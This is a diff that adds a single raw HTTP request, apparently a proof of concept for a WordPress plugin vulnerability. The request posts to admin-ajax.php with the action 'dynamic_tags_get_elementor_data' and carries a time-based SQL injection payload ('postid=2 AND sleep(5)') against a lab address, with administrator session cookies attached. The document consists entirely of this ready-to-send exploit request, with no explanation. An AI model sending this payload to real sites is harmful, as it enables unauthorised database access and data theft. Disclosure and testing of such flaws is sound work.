@@ -1,0 +1,14 @@
+POST /wp-admin/admin-ajax.php?postid=2+AND+sleep(5) HTTP/1.1
+Host: 192.168.128.129:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.128.129:8080/wp-admin/plugins.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: wordpress_ad103584e99177050ac05344f99dca2f=admin%7C1739672183%7CuGjmHbUJ3mYdpdNAFvbVSF8d5QGTLG8Kw7aq7SVu3Un%7C2a6b84b18ad37c67c54cdf1af781976817f8c821a362a06c920949e85acbd135; lang=zh-cn; vision=rnd; device=desktop; theme=default; hideMenu=false; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_ad103584e99177050ac05344f99dca2f=admin%7C1739672183%7CuGjmHbUJ3mYdpdNAFvbVSF8d5QGTLG8Kw7aq7SVu3Un%7C75f75edb1452a572f041ee243f1839890d4d7a1b51ce019627b71c976b79fb7b; wp-settings-time-1=1739501870
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+
+action=dynamic_tags_get_elementor_data
